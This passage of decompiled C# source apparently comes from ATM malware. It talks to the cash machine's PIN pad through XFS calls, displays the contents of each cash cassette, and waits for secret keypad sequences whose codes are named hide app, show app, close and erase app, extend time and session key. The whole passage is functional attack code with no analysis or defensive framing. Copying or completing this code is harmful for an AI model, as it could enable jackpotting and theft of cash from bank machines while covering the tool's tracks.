			RemoveControlFromForm((Control)(object)Globals.cashUnitItemsLeftLabel[num]);
		}
		if (((Control)Globals.myForm).get_Controls().Contains((Control)(object)Globals.cashUnitTotalLabel[num]))
		{
			RemoveControlFromForm((Control)(object)Globals.cashUnitTotalLabel[num]);
		}
		string text = new string(currency);
		int num5 = cassetteNr;
		Globals.cassetteNumberLabel[num].set_Text("CASSETTE " + num5);
		uint num6 = *data;
		Globals.cashUnitNominalLabel[num].set_Text(string.Concat(string.Concat("NOMINAL --> " + num6, " "), text));
		uint num7 = data[1];
		Globals.cashUnitItemsLeftLabel[num].set_Text("ITEMS LEFT --> " + num7);
		uint num8 = data[2];
		Globals.cashUnitTotalLabel[num].set_Text(string.Concat(string.Concat("TOTAL --> " + num8, " "), text));
		int num9 = num4 * 150;
		int num10 = num3 * 330;
		Point location = new Point(num10 + 75, num9 + 20);
		((Control)Globals.cassetteNumberLabel[num]).set_Location(location);
		int x = num10 + 20;
		Point location2 = new Point(x, num9 + 60);
		((Control)Globals.cashUnitNominalLabel[num]).set_Location(location2);
		Point location3 = new Point(x, ((Control)Globals.cashUnitNominalLabel[num]).get_Location().Y + 30);
		((Control)Globals.cashUnitItemsLeftLabel[num]).set_Location(location3);
		Point location4 = new Point(x, ((Control)Globals.cashUnitItemsLeftLabel[num]).get_Location().Y + 30);
		((Control)Globals.cashUnitTotalLabel[num]).set_Location(location4);
		if (STATUS == 0)
		{
			Color red = Color.Red;
			((Control)Globals.cassetteNumberLabel[num]).set_ForeColor(red);
			Color red2 = Color.Red;
			((Control)Globals.cashUnitNominalLabel[num]).set_ForeColor(red2);
			Color red3 = Color.Red;
			((Control)Globals.cashUnitItemsLeftLabel[num]).set_ForeColor(red3);
			Color red4 = Color.Red;
			((Control)Globals.cashUnitTotalLabel[num]).set_ForeColor(red4);
		}
		else
		{
			Color lime = Color.Lime;
			((Control)Globals.cassetteNumberLabel[num]).set_ForeColor(lime);
			Color lime2 = Color.Lime;
			((Control)Globals.cashUnitNominalLabel[num]).set_ForeColor(lime2);
			Color lime3 = Color.Lime;
			((Control)Globals.cashUnitItemsLeftLabel[num]).set_ForeColor(lime3);
			Color lime4 = Color.Lime;
			((Control)Globals.cashUnitTotalLabel[num]).set_ForeColor(lime4);
		}
		AddControlToTheForm((Control)(object)Globals.cassetteNumberLabel[num]);
		AddControlToTheForm((Control)(object)Globals.cashUnitNominalLabel[num]);
		AddControlToTheForm((Control)(object)Globals.cashUnitItemsLeftLabel[num]);
		AddControlToTheForm((Control)(object)Globals.cashUnitTotalLabel[num]);
	}

	private unsafe static Struct15* waitForMasterKey(Struct15* pStruct15_0, uint activeKeysMask, uint terminateKeysMask)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num);
		try
		{
			num = 0u;
			uint num2 = 0u;
			_003CModule_003E.smethod_106(pStruct15_0, 20u, &num2);
			num = 1u;
			_003CModule_003E.smethod_52(pStruct15_0);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_pin_getdata wfs_pin_getdata);
			System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_pin_getdata, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_pin_getdata, 2)), 0);
			*(short*)(&wfs_pin_getdata) = 10;
			System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_pin_getdata, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_pin_getdata, 10)), activeKeysMask);
			System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_pin_getdata, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_pin_getdata, 18)), terminateKeysMask);
			System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_pin_getdata, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_pin_getdata, 6)), 1);
			System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_pin_getdata, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_pin_getdata, 14)), 1);
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct29_0));
			System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_result* ptr);
			int num3 = _003CModule_003E.WFSExecute(_003CModule_003E.pinpadHS, 408u, &wfs_pin_getdata, 0u, &ptr);
			if (num3 == -39)
			{
				prepareXFSManagerAndOpenServiceProviders();
				num3 = _003CModule_003E.WFSExecute(_003CModule_003E.pinpadHS, 408u, &wfs_pin_getdata, 0u, &ptr);
			}
			if (num3 == 0)
			{
				_wfs_pin_data* ptr2 = (_wfs_pin_data*)(int)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>((byte*)ptr + 30);
				int num4 = (int)_003CModule_003E.ppInt_2;
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_118(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct9_0)), System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>(ptr2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
				int num5 = 0;
				if (0u < (uint)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>(ptr2))
				{
					do
					{
						int num6 = num5 + 1;
						_003CModule_003E.smethod_117(_003CModule_003E.smethod_122(_003CModule_003E.smethod_95(_003CModule_003E.smethod_119(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CBD_1)), num6), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY08_0024_0024CBD_1)), System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>((void*)(*(int*)(num5 * 4 + System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 2)) + 2))), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
						_003CModule_003E.smethod_51(pStruct15_0, (uint*)(*(int*)(num5 * 4 + System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 2)) + 2));
						num5 = num6;
					}
					while (num5 < System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>(ptr2));
				}
			}
			else
			{
				int num4 = (int)_003CModule_003E.ppInt_2;
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_119(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_1)), -410), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_119(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct30_0)), -411), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_119(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_2)), -412), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct31_0)), num3), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num4);
				_003CModule_003E.WFSFreeResult(ptr);
				_003CModule_003E.WFSClose(_003CModule_003E.pinpadHS);
				_003CModule_003E.WFSCleanUp();
			}
			return pStruct15_0;
		}
		catch
		{
			//try-fault
			if ((num & (true ? 1u : 0u)) != 0)
			{
				num &= 0xFFFFFFFEu;
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), pStruct15_0);
			}
			throw;
		}
	}

	private unsafe static int getMasterKeyMask(Struct15* keys)
	{
		bool flag;
		Struct15* ptr;
		try
		{
			flag = true;
			ptr = (Struct15*)((byte*)keys + 4);
			uint num = *(uint*)ptr;
			int uint_ = ((num != 0) ? (*(int*)((byte*)keys + 8) - (int)num >> 2) : 0);
			int num2 = (int)_003CModule_003E.ppInt_2;
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_120(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct32_0)), (uint)uint_), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_120(uint_1: (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) != 0) ? ((uint)(System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) >> 2)) : 0u, pStruct54_0: _003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct27_3))), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			uint num3 = *(uint*)ptr;
			int num4 = ((num3 != 0) ? (*(int*)((byte*)keys + 8) - (int)num3 >> 2) : 0);
			int num5 = ((System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) != 0) ? (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) >> 2) : 0);
			if (num4 == num5)
			{
				int num6 = 0;
				while (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) != 0)
				{
					int num7 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) >> 2;
					if ((uint)num6 >= (uint)num7)
					{
						break;
					}
					num3 = *(uint*)ptr;
					if (num3 != 0)
					{
						int num8 = *(int*)((byte*)keys + 8) - (int)num3 >> 2;
						if ((uint)num6 < (uint)num8)
						{
							goto IL_0117;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0117;
					IL_0148:
					int num9;
					if (*(int*)num9 != *(int*)(num6 * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4))))
					{
						flag = false;
					}
					num6++;
					continue;
					IL_0117:
					num9 = num6 * 4 + *(int*)ptr;
					if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) != 0)
					{
						int num10 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_CLOSE_AND_ERASE_APP, 4)) >> 2;
						if ((uint)num6 < (uint)num10)
						{
							goto IL_0148;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0148;
				}
				if (!flag)
				{
					goto IL_019f;
				}
				goto IL_0182;
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_01b1;
		IL_0182:
		uint num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return 9;
		IL_04ba:
		num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return 3;
		IL_03e9:
		try
		{
			uint num12 = *(uint*)ptr;
			int num13 = ((num12 != 0) ? (*(int*)((byte*)keys + 8) - (int)num12 >> 2) : 0);
			uint num14 = _003CModule_003E.smethod_49((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME));
			if (num13 == (int)num14)
			{
				int num15 = 0;
				if (0 < num14)
				{
					do
					{
						num12 = *(uint*)ptr;
						if (num12 != 0)
						{
							int num16 = *(int*)((byte*)keys + 8) - (int)num12 >> 2;
							if ((uint)num15 < (uint)num16)
							{
								goto IL_0424;
							}
						}
						_003CModule_003E._invalid_parameter_noinfo();
						goto IL_0424;
						IL_0453:
						int num17;
						if (*(int*)num17 != *(int*)(num15 * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_EXTEND_TIME, 4))))
						{
							flag = false;
						}
						num15++;
						continue;
						IL_0424:
						num17 = num15 * 4 + *(int*)ptr;
						if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_EXTEND_TIME, 4)) != 0)
						{
							int num18 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_EXTEND_TIME, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_EXTEND_TIME, 4)) >> 2;
							if ((uint)num15 < (uint)num18)
							{
								goto IL_0453;
							}
						}
						_003CModule_003E._invalid_parameter_noinfo();
						goto IL_0453;
					}
					while ((uint)num15 < _003CModule_003E.smethod_49((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_EXTEND_TIME)));
					if (!flag)
					{
						goto IL_04a8;
					}
				}
				goto IL_04ba;
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_04d6;
		IL_019f:
		try
		{
			flag = true;
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_01b1;
		IL_01b1:
		try
		{
			uint num19 = *(uint*)ptr;
			int num20 = ((num19 != 0) ? (*(int*)((byte*)keys + 8) - (int)num19 >> 2) : 0);
			int num21 = ((System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) != 0) ? (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) >> 2) : 0);
			if (num20 == num21)
			{
				int num22 = 0;
				while (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) != 0)
				{
					int num23 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) >> 2;
					if ((uint)num22 >= (uint)num23)
					{
						break;
					}
					num19 = *(uint*)ptr;
					if (num19 != 0)
					{
						int num24 = *(int*)((byte*)keys + 8) - (int)num19 >> 2;
						if ((uint)num22 < (uint)num24)
						{
							goto IL_0234;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0234;
					IL_0265:
					int num25;
					if (*(int*)num25 != *(int*)(num22 * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4))))
					{
						flag = false;
					}
					num22++;
					continue;
					IL_0234:
					num25 = num22 * 4 + *(int*)ptr;
					if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) != 0)
					{
						int num26 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_HIDE_APP, 4)) >> 2;
						if ((uint)num22 < (uint)num26)
						{
							goto IL_0265;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0265;
				}
				if (!flag)
				{
					goto IL_02bb;
				}
				goto IL_029f;
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_02cd;
		IL_029f:
		num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return 1;
		IL_04a8:
		try
		{
			flag = true;
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_04d6;
		IL_03d7:
		try
		{
			flag = true;
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_03e9;
		IL_02bb:
		try
		{
			flag = true;
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_02cd;
		IL_02cd:
		try
		{
			uint num27 = *(uint*)ptr;
			int num28 = ((num27 != 0) ? (*(int*)((byte*)keys + 8) - (int)num27 >> 2) : 0);
			int num29 = ((System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) != 0) ? (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) >> 2) : 0);
			if (num28 == num29)
			{
				int num30 = 0;
				while (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) != 0)
				{
					int num31 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) >> 2;
					if ((uint)num30 >= (uint)num31)
					{
						break;
					}
					num27 = *(uint*)ptr;
					if (num27 != 0)
					{
						int num32 = *(int*)((byte*)keys + 8) - (int)num27 >> 2;
						if ((uint)num30 < (uint)num32)
						{
							goto IL_0350;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0350;
					IL_0381:
					int num33;
					if (*(int*)num33 != *(int*)(num30 * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4))))
					{
						flag = false;
					}
					num30++;
					continue;
					IL_0350:
					num33 = num30 * 4 + *(int*)ptr;
					if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) != 0)
					{
						int num34 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SHOW_APP, 4)) >> 2;
						if ((uint)num30 < (uint)num34)
						{
							goto IL_0381;
						}
					}
					_003CModule_003E._invalid_parameter_noinfo();
					goto IL_0381;
				}
				if (!flag)
				{
					goto IL_03d7;
				}
				goto IL_03bb;
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		goto IL_03e9;
		IL_03bb:
		num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return 0;
		IL_04d6:
		try
		{
			uint num35 = *(uint*)ptr;
			int num36 = ((num35 != 0) ? (*(int*)((byte*)keys + 8) - (int)num35 >> 2) : 0);
			int num37 = ((System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) != 0) ? (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) >> 2) : 0);
			if (num36 == num37 && System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) != 0 && System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) >> 2 != 0)
			{
				int num38 = 0;
				while (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) != 0)
				{
					int num39 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) >> 2;
					int num40 = num39;
					if ((uint)num38 >= (uint)num40)
					{
						break;
					}
					int num41 = num39;
					if ((uint)num38 >= (uint)num41)
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					uint* ptr2 = (uint*)(num38 * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)));
					if (*_003CModule_003E.smethod_50(keys, (uint)num38) != *ptr2)
					{
						flag = false;
					}
					num38++;
				}
				if (flag)
				{
					goto IL_05b8;
				}
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), keys);
			throw;
		}
		num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return -1;
		IL_05b8:
		num11 = *(uint*)ptr;
		if (num11 != 0)
		{
			_003CModule_003E.delete((void*)(int)num11);
		}
		*(int*)ptr = 0;
		*(int*)((byte*)keys + 8) = 0;
		*(int*)((byte*)keys + 12) = 0;
		return 2;
	}

	protected override void OnClosed(EventArgs e)
	{
		((Form)this).OnClosed(e);
		Application.Exit();
	}

	protected unsafe override void WndProc(ref Message m)
	{
		switch (((Message)(ref m)).get_Msg())
		{
		case 295:
			_003CModule_003E.SetFocus(_003CModule_003E.winHWND);
			break;
		case 5:
			_003CModule_003E.SetFocus(_003CModule_003E.winHWND);
			break;
		}
		((Form)this).WndProc(ref m);
	}

	protected unsafe static uint GetEPPState(void* lpParam)
	{
		while (true)
		{
			isPINPadBusy(_003CModule_003E.pinpadHS);
			_003CModule_003E.Sleep(3000u);
		}
	}

	protected unsafe static uint TimeInterval(void* lpParam)
	{
		int num = 0;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct16 @struct);
		_003CModule_003E.smethod_108(&@struct, 7u, &num);
		try
		{
			int* ptr = (int*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct16, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8));
			if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)))
			{
				_003CModule_003E._invalid_parameter_noinfo();
			}
			int* ptr2 = (int*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct16, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4));
